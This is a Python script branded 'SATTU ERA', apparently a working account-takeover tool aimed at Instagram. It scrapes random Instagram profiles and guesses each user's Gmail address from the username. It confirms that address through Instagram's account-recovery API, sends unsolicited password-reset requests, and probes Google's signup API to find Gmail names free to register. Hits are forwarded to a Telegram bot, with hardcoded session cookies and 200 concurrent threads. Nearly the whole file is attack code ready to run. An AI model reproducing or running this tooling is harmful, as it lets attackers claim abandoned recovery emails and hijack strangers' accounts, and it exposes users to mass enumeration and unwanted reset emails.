#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import time
import json
import uuid
import base64
string = __import__('string')
import random
import re
import secrets
import requests
from datetime import datetime
from threading import Thread
from concurrent.futures import ThreadPoolExecutor

P = '\033[38;5;141m'
C = '\033[38;5;45m'
M = '\033[38;5;213m'
G = '\033[38;5;120m'
R = '\033[38;5;203m'
Y = '\033[38;5;221m'
W = '\033[1;97m'
D = '\033[38;5;240m'
GOLD = '\033[38;5;220m'
L = '\033[38;5;183m'
A = '\033[38;5;51m'
O = '\033[38;5;208m'
X = '\033[0m'

OWNER = "@SATTU_ERA"
CHANNEL = "@SATTU_ERA"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def tw():
    try:
        return os.get_terminal_size().columns
    except:
        return 72

def hr(n=None, color=P):
    n = n or min(tw() - 4, 68)
    print(f"  {color}{'─' * n}{X}")

def show_logo():
    clear()
    print()
    print(f"""{P}      ╭───────────────────────────────────────────────╮
{P}      │                                               │
{P}      │      {GOLD}❖{X}  {M}𝐒 𝐀 𝐓 𝐓 𝐔   𝐄 𝐑 𝐀{X}  {GOLD}❖{X}                  {P}│
{P}      │                                               │
{P}      │      {D}instagram mail · hyper scanner{X}          {P}│
{P}      │                                               │
{P}      ╰───────────────────────────────────────────────╯{X}
""")
    print(f"  {D}owner    {X}{W}{OWNER}{X}")
    print(f"  {D}channel  {X}{W}{CHANNEL}{X}")
    print(f"  {D}status   {X}{G}● online & hyper-fast{X}")
    print()

def splash():
    print()
    for name, color in [("mounting engine", C), ("loading profiles", M), ("spawning workers", G), ("opening tunnel", GOLD)]:
        width = 40
        start = time.time()
        while time.time() - start < 0.8:
            p = min((time.time() - start) / 0.8, 1)
            fill = "▰" * int(p * width) + "▱" * (width - int(p * width))
            sys.stdout.write(f"\r  {color}▸{X} {W}{name:<20}{X} {color}{fill}{X}  {GOLD}{int(p*100):3d}%{X}")
            sys.stdout.flush()
            time.sleep(0.02)
        sys.stdout.write(f"\r  {color}▸{X} {W}{name:<20}{X} {G}{'▰' * width}{X}  {G}done{X}\n")
    print()

def display():
    clear()
    print()
    print(f"  {P}╔══════════════════════════════════════════════════════════╗")
    print(f"  {P}║           {GOLD}◈ {M}SATTU ERA · LIVE DASHBOARD {GOLD}◈{P}              ║")
    print(f"  {P}╚══════════════════════════════════════════════════════════╝{X}")
    print()
    print(f"  {C}▸{X} {D}hits{X}      {G}▸ {W}{hits:04d}{X}")
    print(f"  {C}▸{X} {D}bad ig{X}    {R}▸ {W}{bad:04d}{X}")
    print(f"  {C}▸{X} {D}good{X}      {G}▸ {W}{good:04d}{X}")
    print(f"  {C}▸{X} {D}mail{X}      {Y}▸ {W}{(email or 'idle')[:40]}{X}")
    print()
    hr(color=P)
    print(f"  {D}by {OWNER}  ·  {CHANNEL}{X}")
    print()

show_logo()
splash()

hr(color=P)
print(f"  {GOLD}◈ CREDENTIALS{X}")
hr(color=P)
token = input(f"  {C}▸{X} {W}bot token{X}  {D}»{X} ").strip()
chat_id = input(f"  {C}▸{X} {W}chat id{X}    {D}»{X} ").strip()
print()
print(f"  {G}✓{X} {D}session armed — starting hyper workers{X}")
hr(color=P)
time.sleep(0.8)

email = None
hits = 0
bad = 0
good = 0
taken = 0
limit = 0
info = {}
session = requests.session()
_session = requests.session()

def get_tl():
    while True:
        try:
            url = "https://accounts.google.com/_/signup/validatepersonaldetails"
            params = {"hl": "en-GB", "_reqid": "46000", "rt": "j"}
            payload = {
                "continue": "https://accounts.google.com/ManageAccount?nc=1",
                "f.req": '["AEThLlw3_SjR2r7ZvRrESUg3K4e9eBWmlOC4rULBmw9UAcZVy1db7ezAlKKPXcOeac71VE9Ducrl",null,null,null,null,0,0,"aesowns","aesowns",null,0,null,1,[],1]',
                "azt": "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
                "cookiesDisabled": "false",
                "deviceinfo": '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,2,2,2]',
                "gmscoreversion": "null",
                "flowName": "GlifWebSignIn",
                "checkConnection": "youtube:301",
                "checkedDomains": "youtube",
                "pstMsg": "1",
                "": "",
            }
            headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "x-same-domain": "1",
                "google-accounts-xsrf": "1",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "origin": "https://accounts.google.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://accounts.google.com/createaccount?flowName=GlifWebSignIn&flowEntry=ServiceLogin",
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "Cookie": "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN",
            }
            r = _session.post(url, params=params, data=payload, headers=headers, timeout=20)
            if r.status_code != 200:
                time.sleep(2)
                continue
            t = r.text
            if len(t) < 10:
                time.sleep(2)
                continue
            if t.startswith(")]}'"):
                t = t[4:]
            data = json.loads(t)
            tl_1 = data[0][1][2]

            url = "https://accounts.google.com/_/signup/validatebasicinfo"
            params = {"hl": "en-GB", "TL": tl_1, "_reqid": "346000", "rt": "j"}
            payload = {
                "continue": "https://accounts.google.com/ManageAccount?nc=1",
                "f.req": '["TL:' + tl_1 + '",2015,4,15,2,null,null,0,null,null,0,0]',
                "azt": "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
                "cookiesDisabled": "false",
                "deviceinfo": '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,2,2,2]',
                "gmscoreversion": "null",
                "flowName": "GlifWebSignIn",
                "checkConnection": "youtube:301",
                "checkedDomains": "youtube",
                "pstMsg": "1",
                "": "",
            }
            headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "x-same-domain": "1",
                "google-accounts-xsrf": "1",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "origin": "https://accounts.google.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://accounts.google.com/signup/v2/birthdaygender?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL=" + tl_1,
                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "Cookie": "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN",
            }
            r = _session.post(url, params=params, data=payload, headers=headers, timeout=20)
            if r.status_code != 200:
                time.sleep(2)
                continue
            t = r.text
            if t.startswith(")]}'"):
                t = t[4:]
            data = json.loads(t)
            tl = data[0][0][4].split("TL:")[1]
            with open("google.txt", "w") as wf:
                wf.write(tl)
            time.sleep(5)
        except Exception:
            time.sleep(2)
            continue

def reset_password(username):
    try:
        url = "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
        headers = {
            "User-Agent": "Instagram 370.1.0.43.96 Android",
            "x-csrftoken": "missing",
            "accept-language": "en-IN, en-US",
            "Content-Type": "application/x-www-form-urlencoded",
            "x-ig-app-id": "936619743392459",
            "x-requested-with": "XMLHttpRequest",
            "origin": "https://www.instagram.com",
            "referer": "https://www.instagram.com/accounts/password/reset/",
        }
        data = {"email_or_username": username, "flow": "fxcal"}
        r = session.post(url, data=data, headers=headers, timeout=15)
        res = r.json()
        if res.get("status") == "ok":
            return res.get("message", "Reset link sent")
        return None
    except Exception:
        return None

def lookup(email):
    global bad, good, limit
    url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
    device = str(uuid.uuid4())
    family = str(uuid.uuid4())
    android = "android-" + secrets.token_hex(8)
    payload = {
        "params": (
            '{"client_input_params":{"aac":"{\\"aac_init_timestamp\\":' + str(int(time.time())) +
            ',\\"aacjid\\":\\"' + str(uuid.uuid4()) +
            '\\",\\"aaccs\\":\\"' + secrets.token_urlsafe(32) +
            '\\"}","flash_call_permissions_status":{"READ_PHONE_STATE":"PERMANENTLY_DENIED","READ_CALL_LOG":"DENIED","ANSWER_PHONE_CALLS":"DENIED"},"was_headers_prefill_available":0,"network_bssid":null,"sfdid":"","fetched_email_token_list":{},"search_query":"' + email +
            '","auth_secure_device_id":"","ig_oauth_token":[],"cloud_trust_token":null,"was_headers_prefill_used":0,"sso_accounts_auth_data":[],"encrypted_msisdn":"","device_network_info":null,"text_input_id":"akyuf0:61","zero_balance_state":null,"android_build_type":"release","accounts_list":[],"is_oauth_without_permission":0,"ig_android_qe_device_id":"' + device +
            '","gms_incoming_call_retriever_eligibility":"client_not_supported","search_screen_type":"email_or_username","is_whatsapp_installed":1,"lois_settings":{"lois_token":""},"ig_vetted_device_nonce":null,"headers_infra_flow_id":"","fetched_email_list":[]},"server_params":{"event_request_id":"' + str(uuid.uuid4()) +
            '","is_from_logged_out":0,"layered_homepage_experiment_group":null,"device_id":"' + android +
            '","login_surface":"login_home","waterfall_id":"' + str(uuid.uuid4()) +
            '","INTERNAL__latency_qpl_instance_id":6.3987980400102E13,"is_platform_login":0,"context_data":"","login_entry_point":"logged_out","INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"' + family +
            '","offline_experiment_group":"caa_iteration_v3_perf_ig_4","access_flow_version":"pre_mt_behavior","is_from_logged_in_switcher":0,"qe_device_id":"' + device + '"}}'
        ),
        "bk_client_context": '{"bloks_version":"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b","styles_id":"instagram"}',
        "bloks_versioning_id": "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
    }
    headers = {
        "User-Agent": "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
        "accept-language": "en-IN, en-US",
        "x-bloks-version-id": "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
        "x-fb-friendly-name": "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
        "x-ig-android-id": android,
        "x-ig-app-id": "567067343352427",
        "x-ig-app-locale": "en_IN",
        "x-ig-client-endpoint": "com.bloks.www.caa.ar.search",
        "x-ig-device-id": device,
        "x-ig-family-device-id": family,
        "x-ig-timezone-offset": str(datetime.now().astimezone().utcoffset().total_seconds()),
        "x-mid": base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip("="),
        "x-pigeon-rawclienttime": str(time.time()),
        "x-pigeon-session-id": f"UFS-{uuid.uuid4()}-0",
    }
    try:
        r = requests.post(url, data=payload, headers=headers, timeout=15)
        if f"{email}" in r.text:
            good += 1
            display()
            check_gmail(email)
        elif "Sorry, something" in r.text:
            limit += 1
            display()
        else:
            bad += 1
            display()
    except Exception:
        pass

def check_gmail(email):
    global hits, taken
    usr = email.split("@")[0]

    msg = reset_password(usr)
    if msg:
        hits += 1
        display()
        gmail = get_masked(usr)
        send_to_bot(token, chat_id, gmail, usr, email)
        return

    try:
        with open("google.txt", "r") as ys:
            tl = ys.read().strip()
    except Exception:
        time.sleep(2)
        return

    url = "https://accounts.google.com/_/signup/usernameavailability"
    params = {"hl": "en-GB", "TL": tl, "_reqid": "446000", "rt": "j"}
    payload = {
        "continue": "https://accounts.google.com/ManageAccount?nc=1",
        "f.req": '["TL:' + tl + '","' + usr + '",0,0,1,null,1,2464]',
        "azt": "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
        "cookiesDisabled": "false",
        "deviceinfo": '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,2,2,2]',
        "gmscoreversion": "null",
        "flowName": "GlifWebSignIn",
        "checkConnection": "youtube:301",
        "checkedDomains": "youtube",
        "pstMsg": "1",
        "": "",
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "x-same-domain": "1",
        "google-accounts-xsrf": "1",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
        "origin": "https://accounts.google.com",
        "x-client-data": "CP/xygE=",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://accounts.google.com/signup/v2/createusername?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL=" + tl,
        "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cookie": "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN",
    }
    try:
        r = _session.post(url, params=params, data=payload, headers=headers, timeout=15)
        if '"gf.uar",1' in r.text:
            hits += 1
            display()
            gmail = get_masked(usr)
            send_to_bot(token, chat_id, gmail, usr, email)
        else:
            taken += 1
            display()
    except Exception:
        pass

def get_masked(query):
    try:
        url = "https://www.instagram.com/api/graphql"
        payload = {
            "av": "0",
            "__d": "www",
            "__user": "0",
            "__a": "1",
            "__req": "f",
            "__hs": "20563.HYP:instagram_web_pkg.2.1...0",
            "dpr": "3",
            "__ccg": "GOOD",
            "__rev": "1037676804",
            "__s": "nz2w5z:1vm2xs:94sap8",
            "__hsi": "7630740602831122681",
            "__dyn": "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwnU6a3a1YwBgao6C0Mo2swlo5q4U2zxe2GewGw9a361qw8Xwn8e87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK10xKi2K7E5y2-1mwa6byohw5ywuU1FU",
            "__csr": "hcfEI9NcRh48hnvNdsyaD6RnvOldSySDHBpKBLAF6ypAEzC4-ILahjF6S_ui-np4bmqhfR8gCaWFOmjgyiLt9EJ8FeiiGjFeaUO5XyjkBKUhByUGuhddpufW8yZeXx6aCxVxSaz8ycFbxVacxDCx2q8wwG8wHypp9UOawPADz8yaAgO9yVHwiqz89EhwCw05Cuw2eE1ooCU0gByU6IE1gUqU1ao0Vdw2tFnw1ud06Ca0M8fEx2UN7y4bEM3wo1JU2RwSyaOcayU6d7gy0A-9wi6320Ho0N60W8S02VS09vw0lWo",
            "__hsdp": "gSw8N0I1apBoBrysxGCA9cxkImy-u547Fu1lg13o6u8xy458eQ2Smm50y4FEC2Gce4mE64M09g80n9w6QG09SwjE0iCw5Nw",
            "__hblp": "05twAU5q0gum1MwuU24xS6FU98Sq0E8e88Uowda0Ek0S9U1hE0igwmuq6rwa608Gw4BwaK0BUhw9SfwXUcE34w2iE4W09iweK2O0jG1rx-8wZwaW0iq3u",
            "__sjsp": "gSw8N0I1apBoBrysxGCA8yElaxibVUkg9e0mi1Dy8ox1i3J0JBBxg8xaq9wTe",
            "__comet_req": "7",
            "lsd": "AdRhedp9xNI2uNuFwNJXmbUAOw8",
            "jazoest": "22394",
            "__spin_r": "1037676804",
            "__spin_b": "trunk",
            "__spin_t": "1776670246",
            "__crn": "comet.igweb.PolarisCAAIGAccountRecoverySearchRoute",
            "qpl_active_flow_ids": "516759801",
            "fb_api_caller_class": "RelayModern",
            "fb_api_req_friendly_name": "CAAIGAccountSearchViewQuery",
            "server_timestamps": "true",
            "variables": json.dumps({"params": {"event_request_id": "7ca5daae-5770-42dd-b77b-0cf23a865a7f", "next_uri": "", "search_query": query, "waterfall_id": "553aadae-3ec5-4031-8395-efbabcc670ce"}}),
            "doc_id": "26178667145161478",
            "fb_api_analytics_tags": '["qpl_active_flow_ids=516759801"]',
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
            "sec-ch-ua-model": '""',
            "x-ig-app-id": "936619743392459",
            "x-ig-max-touch-points": "5",
            "sec-ch-ua-mobile": "?0",
            "x-fb-friendly-name": "CAAIGAccountSearchViewQuery",
            "x-fb-lsd": "AdRhedp9xNI2uNuFwNJXmbUAOw8",
            "sec-ch-ua-platform-version": '""',
            "x-asbd-id": "359341",
            "sec-ch-ua-full-version-list": '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
            "sec-ch-prefers-color-scheme": "dark",
            "x-csrftoken": "o_6jxh33ZvsQ2eFMyRaM_q",
            "sec-ch-ua-platform": '"Linux"',
            "origin": "https://www.instagram.com",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.instagram.com/accounts/password/reset/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cookie": "csrftoken=o_6jxh33ZvsQ2eFMyRaM_q; datr=YMnlaTJAraHY5ADdYH8UqsTG; ig_did=2046A480-DF50-4660-A5CD-DC58F57C7A1C; mid=aeXJYAABAAGoDWzGwrGALDqzE3Np; dpr=3.558248996734619; wd=774x749",
        }
        r = requests.post(url, data=payload, headers=headers, timeout=15)
        val = next(
            (i["contact_point"] for i in r.json()["data"]["caa_ar_ig_account_search"]["contact_points"] if i["type"] == "EMAIL"),
            None,
        )
        return val if val else None
    except Exception:
        return None

def send_to_bot(token, chat_id, gmail, usr, email_val):
    username = usr
    data = info.get(username, {})

    followers = data.get("follower_count", "None")
    followings = data.get("following_count", 0)
    posts = data.get("media_count", 0)
    private = data.get("is_private", "None")
    name = data.get("full_name", "Not Specified")
    biography = data.get("biography", "No bio")

    content = f"""◈ SATTU ERA HIT ◈

▸ username    »  @{username}
▸ name        »  {name}
▸ domain      »  Gmail
▸ followers   »  {followers}
▸ following   »  {followings}
▸ posts       »  {posts}
▸ type        »  {private}
▸ bio         »  {biography}
▸ profile     »  https://instagram.com/{username}
▸ email       »  {username}@gmail.com

◈ {OWNER}  ·  {CHANNEL}"""

    try:
        requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            data={"chat_id": chat_id, "text": content},
            timeout=15,
        )
    except Exception:
        pass
    with open("SattuEraHits.txt", "a", encoding="utf-8") as a:
        a.write(content + "\n")

def get_tokens():
    while True:
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                "x-ig-app-id": "936619743392459",
                "x-bloks-version-id": "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
                "origin": "https://www.instagram.com",
                "referer": "https://www.instagram.com/",
            }
            r = session.get("https://www.instagram.com/", headers=headers, timeout=15)
            csrf = r.cookies.get("csrftoken", "")
            find = re.search(r'"LSD",\[\],\{"token":"(.*?)"\}', r.text)
            lsd = find.group(1) if find else None
            if csrf and lsd:
                with open("tokens.txt", "w") as fd:
                    fd.write(f"{csrf}|{lsd}")
        except Exception:
            pass
        time.sleep(30)

Thread(target=get_tokens, daemon=True).start()

def load_tokens():
    try:
        with open("tokens.txt", "r") as file:
            parts = file.read().strip().split("|")
            if len(parts) == 2:
                csrf, lsd = parts
                if csrf and lsd:
                    return csrf, lsd
    except Exception:
        pass
    return "bKPOnxXALzrHjjhgVUSXUWvsJSheI52L", "9CaKjXH_JGbfD4zZaTfZ8a"

def prime_usernames():
    global email
    while True:
        csrf, lsd = load_tokens()
        cookies = {
            "rur": '"HIL\\\\0545636887483\\\\0541808136332:01fe43b89fcef61b8a466bfa81acf2b1bbab08f406fc99b1da8b7d889fa68683a3364c43"'
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "x-bloks-version-id": "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
            "x-ig-app-id": "936619743392459",
            "x-fb-lsd": lsd,
            "sec-ch-prefers-color-scheme": "light",
            "x-csrftoken": csrf,
            "sec-ch-ua-platform": '"Android"',
            "origin": "https://www.instagram.com",
            "sec-fetch-site": "same-origin",
        }
        year_ranges = [
            (2500000000, 3499999999),
            (3500000000, 4499999999),
            (4500000000, 5999999999),
            (6000000000, 8999999999),
        ]
        low, high = random.choice(year_ranges)
        user_id = random.randint(low, high)

        variables = {
            "enable_integrity_filters": True,
            "id": str(user_id),
            "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
            "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": False,
        }
        payload = {
            "lsd": lsd,
            "fb_api_caller_class": "RelayModern",
            "fb_api_req_friendly_name": "PolarisProfilePageContentQuery",
            "variables": json.dumps(variables),
            "server_timestamps": "true",
            "doc_id": "26672929172408668",
        }
        try:
            r = session.post("https://www.instagram.com/api/graphql", headers=headers, data=payload, cookies=cookies, timeout=15)
            user = r.json().get("data", {}).get("user", {})
            username = user.get("username")
            followers = user.get("follower_count", 20)
            uid = user.get("pk")
            if username and uid and followers >= 15:
                info[username] = user
                email = username + "@gmail.com"
                lookup(email)
        except Exception:
            pass

Thread(target=get_tl, daemon=True).start()

with ThreadPoolExecutor(max_workers=200) as executor:
    for _ in range(100):
        executor.submit(prime_usernames)

while True:
    time.sleep(1)